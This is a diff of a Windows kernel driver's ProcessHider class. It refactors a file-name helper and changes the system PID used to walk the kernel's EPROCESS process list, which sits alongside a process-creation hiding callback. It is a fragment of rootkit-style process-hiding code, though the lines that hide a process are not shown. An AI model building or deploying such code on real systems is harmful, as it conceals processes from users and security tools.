@@ -27,28 +27,6 @@ namespace filter
 		PsSetCreateProcessNotifyRoutineEx((PCREATE_PROCESS_NOTIFY_ROUTINE_EX)&ProcessHider::HideOnCreateOperation, TRUE);
 	}
 
-	bool ProcessHider::GetShortName(PWCHAR short_name, int size, PUNICODE_STRING long_name)
-	{
-		int long_name_size = long_name->Length / 2;
-		int ans = -1;
-		for (int i = long_name_size - 1; i >= 0; i--)
-		{
-			if (long_name->Buffer[i] == WCHAR(L'\\'))
-			{
-				ans = i;
-				break;
-			}
-		}
-
-		int mem_size = (long_name_size - (ans + 1)) * 2;
-		if (mem_size > size)
-		{
-			return false;
-		}
-		RtlCopyMemory(short_name, &long_name->Buffer[ans + 1], mem_size);
-		return true;
-	}
-
 	bool ProcessHider::GetShortNameByPid(PWCHAR short_name, int size, HANDLE pid)
 	{
 		PEPROCESS eprocess;
@@ -63,7 +41,7 @@ namespace filter
 			return false;
 		}
 		
-		ret = GetShortName(short_name, size, process_name);
+		ret = ulti::GetNameWithoutDirectory(short_name, size, process_name);
 
 		ExFreePool(process_name->Buffer);
 
@@ -82,11 +60,11 @@ namespace filter
 		PLIST_ENTRY next_p_list_entry_eprocess;
 
 		P_CUSTOM_EPROCESS cur_p_eprocess = NULL, next_p_eprocess = NULL;
-		if (PsLookupProcessByProcessId((HANDLE)SYSTEM_IDLE_PID, (PEPROCESS *)&cur_p_eprocess) != STATUS_SUCCESS)
+		if (PsLookupProcessByProcessId((HANDLE)SYSTEM_PID, (PEPROCESS *)&cur_p_eprocess) != STATUS_SUCCESS)
 		{
 			return;
 		}
-		last_pid = SYSTEM_IDLE_PID;
+		last_pid = SYSTEM_PID;
 		while (true)
 		{
 			HANDLE cur_pid = cur_p_eprocess->UniqueProcesId;
@@ -112,7 +90,7 @@ namespace filter
 				}
 			}
 			cur_p_eprocess = next_p_eprocess;
-			if (next_p_eprocess->UniqueProcesId == (HANDLE)SYSTEM_IDLE_PID)
+			if (cur_p_eprocess->UniqueProcesId == (HANDLE)SYSTEM_PID)
 			{
 				break;
 			}
@@ -128,7 +106,7 @@ namespace filter
 		{
 			PUNICODE_STRING process_name = (PUNICODE_STRING)create_info->ImageFileName;
 			
-			if (GetShortName(name, MAX_SIZE, process_name) == false)
+			if (ulti::GetNameWithoutDirectory(name, MAX_SIZE, process_name) == false)
 			{
 				return;
 			}
